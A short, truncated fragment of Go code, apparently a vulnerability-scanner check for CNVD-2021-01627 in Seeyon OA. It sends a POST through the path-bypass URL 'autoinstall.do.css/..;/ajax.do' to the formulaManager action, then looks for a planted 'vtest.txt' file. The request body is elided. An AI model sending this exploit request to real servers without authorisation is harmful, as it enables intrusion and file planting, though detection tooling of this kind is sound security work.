...
func CNVD_2021_01627(u string) bool {
	...
	if req, err := http.Request(u+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", "POST", data, false, nil); err == nil {
		if req.StatusCode == 500 {
			if req2, err := http.Request(u+"/seeyon/vtest.txt", "GET", "", false, nil); err == nil {
